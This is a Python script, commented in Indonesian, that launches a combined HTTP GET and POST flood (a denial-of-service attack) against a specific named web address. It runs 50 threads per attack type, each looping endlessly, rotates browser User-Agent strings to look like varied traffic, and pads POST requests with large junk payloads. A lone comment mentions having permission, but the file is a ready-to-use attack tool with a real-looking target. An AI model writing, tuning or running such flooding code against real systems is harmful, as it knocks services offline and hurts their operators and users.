import threading
import requests
import random
import time

# Daftar User-Agent yang akan digunakan untuk rotasi
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
]

# URL target (pastikan Anda memiliki izin untuk menyerang)
target_url = "https://alwaysxdmar66.hoshiyuki-api.my.id"

# Fungsi untuk serangan GET Flood
def get_flood():
    while True:
        try:
            # Memilih User-Agent acak
            user_agent = random.choice(user_agents)
            headers = {
                "User-Agent": user_agent,
                "Connection": "keep-alive",  # Menjaga koneksi tetap hidup
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Cache-Control": "no-cache",
            }

            # Mengirim permintaan GET
            response = requests.get(target_url, headers=headers, timeout=5)
            print(f"GET Flood: Status {response.status_code} | UA: {user_agent}")

        except requests.exceptions.RequestException as e:
            print(f"[ERROR] GET flood: {e}")

# Fungsi untuk serangan POST Flood dengan payload besar
def post_flood():
    while True:
        try:
            # Memilih User-Agent acak
            user_agent = random.choice(user_agents)
            headers = {
                "User-Agent": user_agent,
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip, deflate, br",
                "Cache-Control": "no-cache",
            }

            # Membuat payload besar untuk POST request
            payload = "data=" + "X" * random.randint(1000, 5000)

            # Mengirim permintaan POST
            response = requests.post(target_url, data=payload, headers=headers, timeout=5)
            print(f"POST Flood: Status {response.status_code} | UA: {user_agent}")

        except requests.exceptions.RequestException as e:
            print(f"[ERROR] POST flood: {e}")

# Fungsi untuk meluncurkan serangan dengan beberapa thread
def start_attack(attack_function, thread_count=100):
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=attack_function)
        threads.append(thread)
        thread.start()

    # Menunggu hingga semua thread selesai
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    try:
        # Mulai serangan GET Flood dan POST Flood secara bersamaan
        print("Memulai serangan GET Flood...")
        get_flood_thread = threading.Thread(target=start_attack, args=(get_flood, 50))
        get_flood_thread.start()

        print("Memulai serangan POST Flood...")
        post_flood_thread = threading.Thread(target=start_attack, args=(post_flood, 50))
        post_flood_thread.start()

        # Menunggu hingga semua thread selesai
        get_flood_thread.join()
        post_flood_thread.join()

    except KeyboardInterrupt:
        print("[INFO] Serangan dihentikan oleh pengguna.")
